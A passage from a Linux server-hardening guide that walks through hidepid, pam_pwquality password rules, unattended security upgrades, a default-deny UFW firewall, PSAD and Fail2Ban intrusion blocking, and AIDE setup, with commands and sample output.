```\\n\\n1. Add this line to `/etc/fstab` to have `/proc` mounted with `hidepid=2`:\\n\\n ```\\n proc /proc proc defaults,hidepid=2 0 0\\n ```\\n \\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n \\n ``` bash\\n echo -e \\\"\\\\nproc /proc proc defaults,hidepid=2 0 0 # added by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")\\\" | sudo tee -a /etc/fstab\\n ```\\n\\n1. Reboot the system:\\n\\n ``` bash\\n sudo reboot now\\n ```\\n \\n **Note**: Alternatively, you can remount `/proc` without rebooting with `sudo mount -o remount,hidepid=2 /proc`\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Force Accounts To Use Secure Passwords\\n\\n#### Why\\n\\nBy default, accounts can use any password they want, including bad ones. [pwquality](https://linux.die.net/man/5/pwquality.conf)/[pam_pwquality](https://linux.die.net/man/8/pam_pwquality) addresses this security gap by providing \\\"a way to configure the default password quality requirements for the system passwords\\\" and checking \\\"its strength against a system dictionary and a set of rules for identifying poor choices.\\\"\\n\\n#### How It Works\\n\\nOn Linux, PAM is responsible for authentication. There are four tasks to PAM that you can read about at https://en.wikipedia.org/wiki/Linux_PAM. This section talks about the password task.\\n\\nWhen there is a need to set or change an account password, the password task of PAM handles the request. In this section we will tell PAM's password task to pass the requested new password to libpam-pwquality to make sure it meets our requirements. If the requirements are met it is used/set; if it does not meet the requirements it errors and lets the user know.\\n\\n#### Goals\\n\\n- enforced strong passwords\\n\\n#### Steps\\n\\n1. Install libpam-pwquality.\\n\\n On Debian based systems:\\n\\n ``` bash\\n sudo apt install libpam-pwquality\\n ```\\n\\n1. Make a backup of PAM's password configuration file `/etc/pam.d/common-password`:\\n\\n ``` bash\\n sudo cp --archive /etc/pam.d/common-password /etc/pam.d/common-password-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n1. Tell PAM to use libpam-pwquality to enforce strong passwords by editing the file `/etc/pam.d/common-password` and change the line that starts like this:\\n\\n ```\\n password requisite pam_pwquality.so\\n ```\\n\\n to this:\\n\\n ```\\n password requisite pam_pwquality.so retry=3 minlen=10 difok=3 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1 maxrepeat=3 gecoschec\\n ```\\n\\n The above options are:\\n\\n - `retry=3` = prompt user 3 times before returning with error.\\n - `minlen=10` = the minimum length of the password, factoring in any credits (or debits) from these:\\n - `dcredit=-1` = must have at least **one digit**\\n - `ucredit=-1` = must have at least **one upper case letter**\\n - `lcredit=-1` = must have at least **one lower case letter**\\n - `ocredit=-1` = must have at least **one non-alphanumeric character**\\n - `difok=3` = at least 3 characters from the new password cannot have been in the old password\\n - `maxrepeat=3` = allow a maximum of 3 repeated characters\\n - `gecoschec` = do not allow passwords with the account's name\\n\\n\\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n\\n ``` bash\\n sudo sed -i -r -e \\\"s/^(password\\\\s+requisite\\\\s+pam_pwquality.so)(.*)$/# \\\\1\\\\2 # commented by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")\\\\n\\\\1 retry=3 minlen=10 difok=3 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1 maxrepeat=3 gecoschec # added by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")/\\\" /etc/pam.d/common-password\\n ```\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Automatic Security Updates and Alerts\\n\\n#### Why\\n\\nIt is important to keep a server updated with the latest **critical security patches and updates**. Otherwise you're at risk of known security vulnerabilities that bad-actors could use to gain unauthorized access to your server.\\n\\nUnless you plan on checking your server every day, you'll want a way to automatically update the system and/or get emails about available updates.\\n\\nYou don't want to do all updates because with every update there is a risk of something breaking. It is important to do the critical updates but everything else can wait until you have time to do it manually.\\n\\n#### Why Not\\n\\nAutomatic and unattended updates may break your system and you may not be near your server to fix it. This would be especially problematic if it broke your SSH access.\\n\\n#### Notes\\n\\n- Each distribution manages packages and updates differently. So far I only have steps for Debian based systems.\\n- Your server will need a way to send e-mails for this to work\\n\\n#### Goals\\n\\n- Automatic, unattended, updates of critical security patches\\n- Automatic emails of remaining pending updates\\n\\n#### Debian Based Systems\\n\\n##### How It Works\\n\\nOn Debian based systems you can use:\\n\\n- unattended-upgrades to automatically do system updates you want (i.e. critical security updates)\\n- apt-listchanges to get details about package changes before they are installed/upgraded\\n- apticron to get emails for pending package updates\\n\\nWe will use unattended-upgrades to apply **critical security patches**. We can also apply stable updates since they've already been thoroughly tested by the Debian community.\\n\\n##### References\\n\\n- https://wiki.debian.org/UnattendedUpgrades\\n- https://debian-handbook.info/browse/stable/sect.regular-upgrades.html\\n- https://blog.sleeplessbeastie.eu/2015/01/02/how-to-perform-unattended-upgrades/\\n- https://www.vultr.com/docs/how-to-set-up-unattended-upgrades-on-debian-9-stretch\\n- https://github.com/mvo5/unattended-upgrades\\n- https://wiki.debian.org/UnattendedUpgrades#apt-listchanges\\n- https://www.cyberciti.biz/faq/apt-get-apticron-send-email-upgrades-available/\\n- https://www.unixmen.com/how-to-get-email-notifications-for-new-updates-on-debianubuntu/\\n- `/etc/apt/apt.conf.d/50unattended-upgrades`\\n\\n##### Steps\\n\\n1. Install unattended-upgrades, apt-listchanges, and apticron:\\n\\n ``` bash\\n sudo apt install unattended-upgrades apt-listchanges apticron\\n ```\\n\\n1. Now we need to configure unattended-upgrades to automatically apply the updates. This is typically done by editing the files `/etc/apt/apt.conf.d/20auto-upgrades` and `/etc/apt/apt.conf.d/50unattended-upgrades` that were created by the packages. However, because these file may get overwritten with a future update, we'll create a new file instead. Create the file `/etc/apt/apt.conf.d/51myunattended-upgrades` and add this:\\n\\n ```\\n // Enable the update/upgrade script (0=disable)\\n APT::Periodic::Enable \\\"1\\\";\\n\\n // Do \\\"apt-get update\\\" automatically every n-days (0=disable)\\n APT::Periodic::Update-Package-Lists \\\"1\\\";\\n\\n // Do \\\"apt-get upgrade --download-only\\\" every n-days (0=disable)\\n APT::Periodic::Download-Upgradeable-Packages \\\"1\\\";\\n\\n // Do \\\"apt-get autoclean\\\" every n-days (0=disable)\\n APT::Periodic::AutocleanInterval \\\"7\\\";\\n\\n // Send report mail to root\\n // 0: no report (or null string)\\n // 1: progress report (actually any string)\\n // 2: + command outputs (remove -qq, remove 2>/dev/null, add -d)\\n // 3: + trace on APT::Periodic::Verbose \\\"2\\\";\\n APT::Periodic::Unattended-Upgrade \\\"1\\\";\\n\\n // Automatically upgrade packages from these\\n Unattended-Upgrade::Origins-Pattern {\\n \\\"o=Debian,a=stable\\\";\\n \\\"o=Debian,a=stable-updates\\\";\\n \\\"origin=Debian,codename=${distro_codename},label=Debian-Security\\\";\\n };\\n\\n // You can specify your own packages to NOT automatically upgrade here\\n Unattended-Upgrade::Package-Blacklist {\\n };\\n\\n // Run dpkg --force-confold --configure -a if a unclean dpkg state is detected to true to ensure that updates get installed even when the system got interrupted during a previous run\\n Unattended-Upgrade::AutoFixInterruptedDpkg \\\"true\\\";\\n\\n //Perform the upgrade when the machine is running because we wont be shutting our server down often\\n Unattended-Upgrade::InstallOnShutdown \\\"false\\\";\\n\\n // Send an email to this address with information about the packages upgraded.\\n Unattended-Upgrade::Mail \\\"root\\\";\\n\\n // Always send an e-mail\\n Unattended-Upgrade::MailOnlyOnError \\\"false\\\";\\n\\n // Remove all unused dependencies after the upgrade has finished\\n Unattended-Upgrade::Remove-Unused-Dependencies \\\"true\\\";\\n\\n // Remove any new unused dependencies after the upgrade has finished\\n Unattended-Upgrade::Remove-New-Unused-Dependencies \\\"true\\\";\\n\\n // Automatically reboot WITHOUT CONFIRMATION if the file /var/run/reboot-required is found after the upgrade.\\n Unattended-Upgrade::Automatic-Reboot \\\"true\\\";\\n\\n // Automatically reboot even if users are logged in.\\n Unattended-Upgrade::Automatic-Reboot-WithUsers \\\"true\\\";\\n ```\\n\\n **Notes**:\\n - Check `/usr/lib/apt/apt.systemd.daily` for details on the `APT::Periodic` options\\n - Check https://github.com/mvo5/unattended-upgrades for details on the `Unattended-Upgrade` options\\n\\n1. Run a dry-run of unattended-upgrades to make sure your configuration file is okay:\\n\\n ``` bash\\n sudo unattended-upgrade -d --dry-run\\n ```\\n\\n If everything is okay, you can let it run whenever it's scheduled to or force a run with `unattended-upgrade -d`.\\n\\n1. Configure apt-listchanges to your liking:\\n\\n ``` bash\\n sudo dpkg-reconfigure apt-listchanges\\n ```\\n\\n1. For apticron, the default settings are good enough but you can check them in `/etc/apticron/apticron.conf` if you want to change them. For example, my configuration looks like this:\\n\\n > ```\\n > EMAIL=\\\"root\\\"\\n > NOTIFY_NO_UPDATES=\\\"1\\\"\\n > ```\\n\\n([Table of Contents](#table-of-contents))\\n\\n### More Secure Random Entropy Pool (WIP)\\n\\n#### Why\\n\\nWIP\\n\\n#### How It Works\\n\\nWIP\\n\\n#### Goals\\n\\nWIP\\n\\n#### References\\n\\n- Thanks to [branneman](https://github.com/branneman) for this idea as submitted in [issue #33](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/issues/33).\\n- https://hackaday.com/2017/11/02/what-is-entropy-and-how-do-i-get-more-of-it/\\n- https://www.2uo.de/myths-about-urandom\\n- https://www.gnu.org/software/hurd/user/tlecarrour/rng-tools.html\\n- https://wiki.archlinux.org/index.php/Rng-tools\\n\\n#### Steps\\n\\n1. Install rng-tools.\\n \\n On Debian based systems:\\n\\n ``` bash\\n sudo apt-get install rng-tools\\n ```\\n\\n([Table of Contents](#table-of-contents))\\n\\n## The Network\\n\\n### Firewall With UFW (Uncomplicated Firewall)\\n\\n#### Why\\n\\nCall me paranoid, and you don't have to agree, but I want to deny all traffic in and out of my server except what I explicitly allow. Why would my server be sending traffic out that I don't know about? And why would external traffic be trying to access my server if I don't know who or what it is? When it comes to good security, my opinion is to reject/deny by default, and allow by exception.\\n\\nOf course, if you disagree, that is totally fine and can configure UFW to suit your needs.\\n\\nEither way, ensuring that only traffic we explicitly allow is the job of a firewall.\\n\\n#### How It Works\\n\\nThe Linux kernel provides capabilities to monitor and control network traffic. These capabilities are exposed to the end-user through firewall utilities. On Linux, the most common firewall is [iptables](https://en.wikipedia.org/wiki/Iptables). However, iptables is rather complicated and confusing (IMHO). This is where UFW comes in. Think of UFW as a front-end to iptables. It simplifies the process of managing the iptables rules that tell the Linux kernel what to do with network traffic.\\n\\n**UFW** works by letting you configure rules that:\\n\\n- **allow** or **deny**\\n- **input** or **output** traffic\\n- **to** or **from** ports\\n\\nYou can create rules by explicitly specifying the ports or with application configurations that specify the ports.\\n\\n#### Goals\\n\\n - all network traffic, input and output, blocked except those we explicitly allow\\n\\n#### Notes\\n\\n- As you install other programs, you'll need to enable the necessary ports/applications.\\n\\n#### References\\n\\n- https://launchpad.net/ufw\\n\\n#### Steps\\n\\n1. Install ufw.\\n\\n On Debian based systems:\\n\\n ``` bash\\n sudo apt install ufw\\n ```\\n\\n1. Deny all outgoing traffic:\\n\\n ``` bash\\n sudo ufw default deny outgoing comment 'deny all outgoing traffic'\\n ```\\n\\n > ```\\n > Default outgoing policy changed to 'deny'\\n > (be sure to update your rules accordingly)\\n > ```\\n\\n If you are not as paranoid as me, and don't want to deny all outgoing traffic, you can allow it instead:\\n\\n ``` bash\\n sudo ufw default allow outgoing comment 'allow all outgoing traffic'\\n ```\\n\\n1. Deny all incoming traffic:\\n\\n ``` bash\\n sudo ufw default deny incoming comment 'deny all incoming traffic'\\n ```\\n\\n1. Obviously we want SSH connections in:\\n\\n ``` bash\\n sudo ufw limit in ssh comment 'allow SSH connections in'\\n ```\\n\\n > ```\\n > Rules updated\\n > Rules updated (v6)\\n > ```\\n\\n1. Allow additional traffic as per your needs. Some common use-cases:\\n\\n ``` bash\\n # allow traffic out on port 53 -- DNS\\n sudo ufw allow out 53 comment 'allow DNS calls out'\\n\\t\\n\\t# allow traffic out on port 123 -- NTP\\n sudo ufw allow out 123 comment 'allow NTP out'\\n\\n # allow traffic out for HTTP, HTTPS, or FTP\\n # apt might needs these depending on which sources you're using\\n sudo ufw allow out http comment 'allow HTTP traffic out'\\n sudo ufw allow out https comment 'allow HTTPS traffic out'\\n sudo ufw allow out ftp comment 'allow FTP traffic out'\\n\\n # allow whois\\n sudo ufw allow out whois comment 'allow whois'\\n\\n # allow traffic out on port 68 -- the DHCP client\\n # you only need this if you're using DHCP\\n sudo ufw allow out 68 comment 'allow the DHCP client to update'\\n ```\\n\\n1. Start ufw:\\n\\n ``` bash\\n sudo ufw enable\\n ```\\n\\n > ```\\n > Command may disrupt existing ssh connections. Proceed with operation (y|n)? y\\n > Firewall is active and enabled on system startup\\n > ```\\n\\n1. If you want to see a status:\\n\\n ``` bash\\n sudo ufw status\\n ```\\n\\n > ```\\n > Status: active\\n > \\n > To Action From\\n > -- ------ ----\\n > 22/tcp LIMIT Anywhere # allow SSH connections in\\n > 22/tcp (v6) LIMIT Anywhere (v6) # allow SSH connections in\\n > \\n > 53 ALLOW OUT Anywhere # allow DNS calls out\\n > 123 ALLOW OUT Anywhere # allow NTP out\\n > 80/tcp ALLOW OUT Anywhere # allow HTTP traffic out\\n > 443/tcp ALLOW OUT Anywhere # allow HTTPS traffic out\\n > 21/tcp ALLOW OUT Anywhere # allow FTP traffic out\\n > Mail submission ALLOW OUT Anywhere # allow mail out\\n > 43/tcp ALLOW OUT Anywhere # allow whois\\n > 53 (v6) ALLOW OUT Anywhere (v6) # allow DNS calls out\\n > 123 (v6) ALLOW OUT Anywhere (v6) # allow NTP out\\n > 80/tcp (v6) ALLOW OUT Anywhere (v6) # allow HTTP traffic out\\n > 443/tcp (v6) ALLOW OUT Anywhere (v6) # allow HTTPS traffic out\\n > 21/tcp (v6) ALLOW OUT Anywhere (v6) # allow FTP traffic out\\n > Mail submission (v6) ALLOW OUT Anywhere (v6) # allow mail out\\n > 43/tcp (v6) ALLOW OUT Anywhere (v6) # allow whois\\n > ```\\n\\n or\\n\\n ``` bash\\n sudo ufw status verbose\\n ```\\n\\n > ```\\n > Status: active\\n > Logging: on (low)\\n > Default: deny (incoming), deny (outgoing), disabled (routed)\\n > New profiles: skip\\n > \\n > To Action From\\n > -- ------ ----\\n > 22/tcp LIMIT IN Anywhere # allow SSH connections in\\n > 22/tcp (v6) LIMIT IN Anywhere (v6) # allow SSH connections in\\n > \\n > 53 ALLOW OUT Anywhere # allow DNS calls out\\n > 123 ALLOW OUT Anywhere # allow NTP out\\n > 80/tcp ALLOW OUT Anywhere # allow HTTP traffic out\\n > 443/tcp ALLOW OUT Anywhere # allow HTTPS traffic out\\n > 21/tcp ALLOW OUT Anywhere # allow FTP traffic out\\n > 587/tcp (Mail submission) ALLOW OUT Anywhere # allow mail out\\n > 43/tcp ALLOW OUT Anywhere # allow whois\\n > 53 (v6) ALLOW OUT Anywhere (v6) # allow DNS calls out\\n > 123 (v6) ALLOW OUT Anywhere (v6) # allow NTP out\\n > 80/tcp (v6) ALLOW OUT Anywhere (v6) # allow HTTP traffic out\\n > 443/tcp (v6) ALLOW OUT Anywhere (v6) # allow HTTPS traffic out\\n > 21/tcp (v6) ALLOW OUT Anywhere (v6) # allow FTP traffic out\\n > 587/tcp (Mail submission (v6)) ALLOW OUT Anywhere (v6) # allow mail out\\n > 43/tcp (v6) ALLOW OUT Anywhere (v6) # allow whois\\n > ```\\n\\n#### Default Applications\\n\\nufw ships with some default applications. You can see them with:\\n\\n``` bash\\nsudo ufw app list\\n```\\n\\n> ```\\n> Available applications:\\n> AIM\\n> Bonjour\\n> CIFS\\n> DNS\\n> Deluge\\n> IMAP\\n> IMAPS\\n> IPP\\n> KTorrent\\n> Kerberos Admin\\n> Kerberos Full\\n> Kerberos KDC\\n> Kerberos Password\\n> LDAP\\n> LDAPS\\n> LPD\\n> MSN\\n> MSN SSL\\n> Mail submission\\n> NFS\\n> OpenSSH\\n> POP3\\n> POP3S\\n> PeopleNearby\\n> SMTP\\n> SSH\\n> Socks\\n> Telnet\\n> Transmission\\n> Transparent Proxy\\n> VNC\\n> WWW\\n> WWW Cache\\n> WWW Full\\n> WWW Secure\\n> XMPP\\n> Yahoo\\n> qBittorrent\\n> svnserve\\n> ```\\n\\nTo get details about the app, like which ports it includes, type:\\n\\n``` bash\\nsudo ufw app info [app name]\\n```\\n\\n> ``` bash\\n> sudo ufw app info DNS\\n> ```\\n> \\n> ```\\n> Profile: DNS\\n> Title: Internet Domain Name Server\\n> Description: Internet Domain Name Server\\n> \\n> Port:\\n> 53\\n> ```\\n\\n#### Custom Application\\n\\nIf you don't want to create rules by explicitly providing the port number(s), you can create your own application configurations. To do this, create a file in `/etc/ufw/applications.d`.\\n\\nFor example, here is what you would use for [Plex](https://support.plex.tv/articles/201543147-what-network-ports-do-i-need-to-allow-through-my-firewall/):\\n\\n``` bash\\ncat /etc/ufw/applications.d/plexmediaserver\\n```\\n\\n> ```\\n> [PlexMediaServer]\\n> title=Plex Media Server\\n> description=This opens up PlexMediaServer for http (32400), upnp, and autodiscovery.\\n> ports=32469/tcp|32413/udp|1900/udp|32400/tcp|32412/udp|32410/udp|32414/udp|32400/udp\\n> ```\\n\\nThen you can enable it like any other app:\\n\\n```bash\\nsudo ufw allow plexmediaserver\\n```\\n\\n([Table of Contents](#table-of-contents))\\n\\n### iptables Intrusion Detection And Prevention with PSAD\\n\\n#### Why\\n\\nEven if you have a firewall to guard your doors, it is possible to try brute-forcing your way in any of the guarded doors. We want to monitor all network activity to detect potential intrusion attempts, such has repeated attempts to get in, and block them.\\n\\n#### How It Works\\n\\nI can't explain it any better than user [FINESEC](https://serverfault.com/users/143961/finesec) from https://serverfault.com/ did at: https://serverfault.com/a/447604/289829.\\n\\n> Fail2BAN scans log files of various applications such as apache, ssh or ftp and automatically bans IPs that show the malicious signs such as automated login attempts. PSAD on the other hand scans iptables and ip6tables log messages (typically /var/log/messages) to detect and optionally block scans and other types of suspect traffic such as DDoS or OS fingerprinting attempts. It's ok to use both programs at the same time because they operate on different level.\\n\\nAnd, since we're already using [UFW](#ufw-uncomplicated-firewall) so we'll follow the awesome instructions by [netson](https://gist.github.com/netson) at https://gist.github.com/netson/c45b2dc4e835761fbccc to make PSAD work with UFW.\\n\\n#### References\\n\\n- http://www.cipherdyne.org/psad/\\n- http://www.cipherdyne.org/psad/docs/config.html\\n- https://www.thefanclub.co.za/how-to/how-install-psad-intrusion-detection-ubuntu-1204-lts-server\\n- https://serverfault.com/a/447604/289829\\n- https://serverfault.com/a/770424/289829\\n- https://gist.github.com/netson/c45b2dc4e835761fbccc-\\n\\n#### Steps\\n\\n1. Install psad.\\n\\n On Debian based systems:\\n\\n ``` bash\\n sudo apt install psad\\n ```\\n\\n1. Make a backup of psad's configuration file `/etc/psad/psad.conf`:\\n\\n ``` bash\\n sudo cp --archive /etc/psad/psad.conf /etc/psad/psad.conf-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n1. Review and update configuration options in `/etc/psad/psad.conf`. Pay special attention to these:\\n\\n |Setting|Set To\\n |--|--|\\n |[`EMAIL_ADDRESSES`](http://www.cipherdyne.org/psad/docs/config.html#EMAIL_ADDRESSES)|your email address(s)|\\n |`HOSTNAME`|your server's hostname|\\n |[`ENABLE_AUTO_IDS`](http://www.cipherdyne.org/psad/docs/config.html#ENABLE_AUTO_IDS)|`ENABLE_AUTO_IDS Y;`|\\n |`ENABLE_AUTO_IDS_EMAILS`|`ENABLE_AUTO_IDS_EMAILS Y;`|\\n |`EXPECT_TCP_OPTIONS`|`EXPECT_TCP_OPTIONS Y;`|\\n\\n Check the configuration file psad's documentation at http://www.cipherdyne.org/psad/docs/config.html for more details.\\n\\n1. <a name=\\\"psad_step4\\\"></a>Now we need to make some changes to ufw so it works with psad by telling ufw to log all traffic so psad can analyze it. Do this by editing **two files** and adding these lines **at the end but before the COMMIT line**.\\n\\n Make backups:\\n\\n ``` bash\\n sudo cp --archive /etc/ufw/before.rules /etc/ufw/before.rules-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n sudo cp --archive /etc/ufw/before6.rules /etc/ufw/before6.rules-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n Edit the files:\\n\\n - `/etc/ufw/before.rules`\\n - `/etc/ufw/before6.rules`\\n\\n And add add this **at the end but before the COMMIT line**:\\n\\n ```\\n # log all traffic so psad can analyze\\n -A INPUT -j LOG --log-tcp-options --log-prefix \\\"[IPTABLES] \\\"\\n -A FORWARD -j LOG --log-tcp-options --log-prefix \\\"[IPTABLES] \\\"\\n ```\\n\\n **Note**: We're adding a log prefix to all the iptables logs. We'll need this for [seperating iptables logs to their own file](#ns-separate-iptables-log-file).\\n\\n For example:\\n\\n > ```\\n > ...\\n > \\n > # log all traffic so psad can analyze\\n > -A INPUT -j LOG --log-tcp-options --log-prefix \\\"[IPTABLES] \\\"\\n > -A FORWARD -j LOG --log-tcp-options --log-prefix \\\"[IPTABLES] \\\"\\n > \\n > # don't delete the 'COMMIT' line or these rules won't be processed\\n > COMMIT\\n > ```\\n\\n1. Now we need to reload/restart ufw and psad for the changes to take effect:\\n\\n ``` bash\\n sudo ufw reload\\n\\n sudo psad -R\\n sudo psad --sig-update\\n sudo psad -H\\n ```\\n\\n1. Analyze iptables rules for errors:\\n\\n ``` bash\\n sudo psad --fw-analyze\\n ```\\n\\n > ```\\n > [+] Parsing INPUT chain rules.\\n > [+] Parsing INPUT chain rules.\\n > [+] Firewall config looks good.\\n > [+] Completed check of firewall ruleset.\\n > [+] Results in /var/log/psad/fw_check\\n > [+] Exiting.\\n > ```\\n\\n **Note**: If there were any issues you will get an e-mail with the error.\\n\\n1. Check the status of psad:\\n\\n ``` bash\\n sudo psad --Status\\n ```\\n\\n > ```\\n > [-] psad: pid file /var/run/psad/psadwatchd.pid does not exist for psadwatchd on vm\\n > [+] psad_fw_read (pid: 3444) %CPU: 0.0 %MEM: 2.2\\n > Running since: Sat Feb 16 01:03:09 2019\\n > \\n > [+] psad (pid: 3435) %CPU: 0.2 %MEM: 2.7\\n > Running since: Sat Feb 16 01:03:09 2019\\n > Command line arguments: [none specified]\\n > Alert email address(es): root@localhost\\n > \\n > [+] Version: psad v2.4.3\\n > \\n > [+] Top 50 signature matches:\\n > [NONE]\\n > \\n > [+] Top 25 attackers:\\n > [NONE]\\n > \\n > [+] Top 20 scanned ports:\\n > [NONE]\\n > \\n > [+] iptables log prefix counters:\\n > [NONE]\\n > \\n > Total protocol packet counters:\\n > \\n > [+] IP Status Detail:\\n > [NONE]\\n > \\n > Total scan sources: 0\\n > Total scan destinations: 0\\n > \\n > [+] These results are available in: /var/log/psad/status.out\\n > ```\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Application Intrusion Detection And Prevention With Fail2Ban\\n\\n#### Why\\n\\nUFW tells your server what doors to board up so nobody can see them, and what doors to allow authorized users through. PSAD monitors network activity to detect and prevent potential intrusions -- repeated attempts to get in. \\n\\nBut what about the applications/services your server is running, like SSH and Apache, where your firewall is configured to allow access in. Even though access may be allowed that doesn't mean all access attempts are valid and harmless. What if someone tries to brute-force their way in to a web-app you're running on your server? This is where Fail2ban comes in.\\n\\n#### How It Works\\n\\nFail2ban monitors the logs of your applications (like SSH and Apache) to detect and prevent potential intrusions. It will monitor network traffic/logs and prevent intrusions by blocking suspicious activity (e.g. multiple successive failed connections in a short time-span).\\n\\n#### Goals\\n\\n- network monitoring for suspicious activity with automatic banning of offending IPs\\n\\n#### Notes\\n\\n- As of right now, the only thing running on this server is SSH so we'll want Fail2ban to monitor SSH and ban as necessary.\\n- As you install other programs, you'll need to create/configure the appropriate jails and enable them.\\n\\n#### References\\n\\n- https://www.fail2ban.org/\\n- https://blog.vigilcode.com/2011/05/ufw-with-fail2ban-quick-secure-setup-part-ii/\\n- https://dodwell.us/security/ufw-fail2ban-portscan.html\\n- https://www.howtoforge.com/community/threads/fail2ban-and-ufw-on-debian.77261/\\n\\n#### Steps\\n\\n1. Install fail2ban.\\n\\n On Debian based systems:\\n\\n ``` bash\\n sudo apt install fail2ban\\n ```\\n\\n1. We don't want to edit `/etc/fail2ban/fail2ban.conf` or `/etc/fail2ban/jail.conf` because a future update may overwrite those so we'll create a local copy instead. Create the file `/etc/fail2ban/jail.local` and add this to it after replacing `[LAN SEGMENT]` and `[your email]` with the appropriate values:\\n\\n ```\\n [DEFAULT]\\n # the IP address range we want to ignore\\n ignoreip = 127.0.0.1/8 [LAN SEGMENT]\\n\\n # who to send e-mail to\\n destemail = [your e-mail]\\n\\n # who is the email from\\n sender = [your e-mail]\\n\\n # since we're using exim4 to send emails\\n mta = mail\\n\\n # get email alerts\\n action = %(action_mwl)s\\n ```\\n\\n **Note**: Your server will need to be able to send e-mails so Fail2ban can let you know of suspicious activity and when it banned an IP.\\n\\n1. We need to create a jail for SSH that tells fail2ban to look at SSH logs and use ufw to ban/unban IPs as needed. Create a jail for SSH by creating the file `/etc/fail2ban/jail.d/ssh.local` and adding this to it:\\n\\n ```\\n [sshd]\\n enabled = true\\n banaction = ufw\\n port = ssh\\n filter = sshd\\n logpath = %(sshd_log)s\\n maxretry = 5\\n ```\\n\\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n\\n ``` bash\\n cat << EOF | sudo tee /etc/fail2ban/jail.d/ssh.local\\n [sshd]\\n enabled = true\\n banaction = ufw\\n port = ssh\\n filter = sshd\\n logpath = %(sshd_log)s\\n maxretry = 5\\n EOF\\n ```\\n\\n1. In the above we tell fail2ban to use the ufw as the `banaction`. Fail2ban ships with an action configuration file for ufw. You can see it in `/etc/fail2ban/action.d/ufw.conf`\\n\\n1. Enable fail2ban and the jail for SSH:\\n\\n ``` bash\\n sudo fail2ban-client start\\n sudo fail2ban-client reload\\n sudo fail2ban-client add sshd\\n ```\\n\\n1. To check the status:\\n\\n ``` bash\\n sudo fail2ban-client status\\n ```\\n\\n > ```\\n > Status\\n > |- Number of jail: 1\\n > `- Jail list: sshd\\n > ```\\n\\n ``` bash\\n sudo fail2ban-client status sshd\\n ```\\n\\n > ```\\n > Status for the jail: sshd\\n > |- Filter\\n > | |- Currently failed: 0\\n > | |- Total failed: 0\\n > | `- File list: /var/log/auth.log\\n > `- Actions\\n > |- Currently banned: 0\\n > |- Total banned: 0\\n > `- Banned IP list:\\n > ```\\n\\n#### Custom Jails\\n\\nI have not needed to create a custom jail yet. Once I do, and I figure out how, I will update this guide. Or, if you know how please help [contribute](#contributing).\\n\\n#### Unban an IP\\n\\nTo unban an IP use this command:\\n\\n``` bash\\nfail2ban-client set [jail] unbanip [IP]\\n```\\n\\n`[jail]` is the name of the jail that has the banned IP and `[IP]` is the IP address you want to unban. For example, to unaban `192.168.1.100` from SSH you would do:\\n\\n``` bash\\nfail2ban-client set sshd unbanip 192.168.1.100\\n```\\n\\n([Table of Contents](#table-of-contents))\\n\\n## The Auditing\\n\\n### File/Folder Integrity Monitoring With AIDE (WIP)\\n\\n#### Why\\n\\nWIP\\n\\n#### How It Works\\n\\nWIP\\n\\n#### Goals\\n\\nWIP\\n\\n#### References\\n\\n- https://aide.github.io/\\n- https://www.hiroom2.com/2017/06/09/debian-8-file-integrity-check-with-aide/\\n- https://blog.rapid7.com/2017/06/30/how-to-install-and-configure-aide-on-ubuntu-linux/\\n- https://www.stephenrlang.com/2016/03/using-aide-for-file-integrity-monitoring-fim-on-ubuntu/\\n- https://www.howtoforge.com/how-to-configure-the-aide-advanced-intrusion-detection-environment-file-integrity-scanner-for-your-website\\n- https://www.tecmint.com/check-integrity-of-file-and-directory-using-aide-in-linux/\\n- https://www.cyberciti.biz/faq/debian-ubuntu-linux-software-integrity-checking-with-aide/\\n\\n#### Steps\\n\\n1. Install AIDE.\\n\\n On Debian based systems:\\n \\n ``` bash\\n sudo apt install aide\\n ```\\n \\n1. Make a backup of AIDE's defaults file:\\n\\n ``` bash\\n sudo cp -p /etc/default/aide /etc/default/aide-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n1. Go through `/etc/default/aide` and set AIDE's defaults per your requirements. If you want AIDE to run daily and e-mail you, be sure to set `CRON_DAILY_RUN` to `yes`.\\n\\n1. Make a backup of AIDE's configuration files:\\n\\n ``` bash\\n sudo cp -pr /etc/aide /etc/aide-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n1. On Debian based systems:\\n\\n - AIDE's configuration files are in `/etc/aide/aide.conf.d/`.\\n - You'll want to go through AIDE's documentation and the configuration files in to set them per your requirements.\\n - If you want new settings, to monitor a new folder for example, you'll want to add them to `/etc/aide/aide.conf` or `/etc/aide/aide.conf.d/`.\\n - Take a backup of the stock configuration files: `sudo cp -pr /etc/aide /etc/aide-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")`.\\n\\n1. Create a new database, and install it.\\n \\n On Debian based systems:\\n\\n ``` bash\\n sudo aideinit\\n ```\\n \\n > ```\\n > Running aide --init...\\n > Start timestamp: 2019-04-01 21:23:37 -0400 (AIDE 0.16)\\n > AIDE initialized database at /var/lib/aide/aide.db.new\\n > Verbose level: 6\\n > \\n > Number of entries: 25973\\n > \\n > ---------------------------------------------------\\n > The attributes of the (uncompressed) database(s):\\n > ---------------------------------------------------\\n > \\n > /var/lib/aide/aide.db.new\\n > RMD160 : moyQ1YskQQbidX+Lusv3g2wf1gQ=\\n > TIGER : 7WoOgCrXzSpDrlO6I3PyXPj1gRiaMSeo\\n > SHA256 : gVx8Fp7r3800WF2aeXl+/KHCzfGsNi7O\\n > g16VTPpIfYQ=\\n > SHA512 : GYfa0DJwWgMLl4Goo5VFVOhu4BphXCo3\\n > rZnk49PYztwu50XjaAvsVuTjJY5uIYrG\\n > tV+jt3ELvwFzGefq4ZBNMg==\\n > CRC32 : /cusZw==\\n > HAVAL : 